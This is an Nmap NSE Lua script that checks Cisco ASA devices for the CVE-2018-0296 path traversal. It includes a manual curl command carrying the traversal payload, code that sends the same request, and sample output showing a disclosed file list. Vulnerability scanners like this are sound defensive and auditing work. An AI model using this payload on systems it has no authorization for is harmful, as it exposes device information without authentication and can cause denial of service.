description = [[
A vulnerability in the web interface of the Cisco Adaptive Security Appliance (ASA) could allow an unauthenticated, remote attacker to cause an affected device to reload
unexpectedly, resulting in a denial of service (DoS) condition. It is also possible on certain software releases that the ASA will not reload, but an attacker could view
sensitive system information without authentication by using directory traversal techniques. The vulnerability is due to lack of proper input validation of the HTTP URL.
An attacker could exploit this vulnerability by sending a crafted HTTP request to an affected device. The exploit could allow the attacker to cause a DoS condition or unauthenticated
disclosure of information. CVE-2018-0296
Manual inspection:
# curl -i -s -k -X $'GET'
-H $'Host: <target>'
$'http://<target>/+CSCOU+/../+CSCOE+/files/file_list.json'

References:
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd'
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0296
]]

---
-- @usage
-- nmap -p443 --script CVE-2018-0296.nse <target>
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | cve-2018-0296:
-- |   VULNERABLE:
-- |   Cisco Adaptive Security Appliance Path Traversal
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2018-0296
-- |       The exploit could allow the attacker to cause a DoS condition or unauthenticated disclosure of information.
-- |     Disclosure date: 2017-11-27
-- |     Check results:
-- |
-- |         ........name...locale...size..0..type...1...mdate..1586048472.....name....CSCOT....size..0..type...1...mdate..1586048472.....name....CSCOCA....size..0..type...1...mdate..1586048472.....name....CSCOL....size..0..type...1...mdate..1586048472.....name...CSCOSSLC...size..0..type...1...mdate..1586048472.....name...mus...size..0..type...1...mdate..1586048472.....name...admin...size..0..type...1...mdate..1586048472.....name...bookmarks...size..0..type...1...mdate..1586048472.....name...customization...size..0..type...1...mdate..1586048472.....name....CSCOM....size..0..type...1...mdate..1586048472.....name....CSCOU....size..0..type...1...mdate..1586048472.....name....CSCOE....size..0..type...1...mdate..1586048472.....name...sessions...size..0..type...1...mdate..1586048472..
-- |
-- |     References:
-- |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0296


author = "Ismail Erkek"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "exploit"}

local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local string = require "string"
local vulns = require "vulns"

portrule = shortport.http

action = function(host, port)
    local vuln = {
        title = "Cisco Adaptive Security Appliance Path Traversal",
        state = vulns.STATE.NOT_VULN,
        IDS = { CVE = 'CVE-2018-0296' },
                description = [[
The exploit could allow the attacker to cause a DoS condition or unauthenticated disclosure of information.]],

                references = {
           'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0296'
       },
       dates = {
           disclosure = {year = '2017', month = '11', day = '27'},
       },

    }

    local report = vulns.Report:new(SCRIPT_NAME, host, port)

    local uri = "/+CSCOU+/../+CSCOE+/files/file_list.json"

    local options = {header={}}
    options['header']['User-Agent'] = "Mozilla/5.0"

    local response = http.post(host, port, uri)

        local output = {}

        local filelist
    if ( response.status == 200 ) then

    local title = string.match(response.body, "name")

        if (title == "name") then
                vuln.state = vulns.STATE.EXPLOIT
                filelist = response.body:gsub('%W','.')
                vuln.check_results = stdnse.format_output(true, filelist)
        else
                vuln.state = vulns.STATE.NOT_VULN
end
    end
    return report:make_output (vuln)
end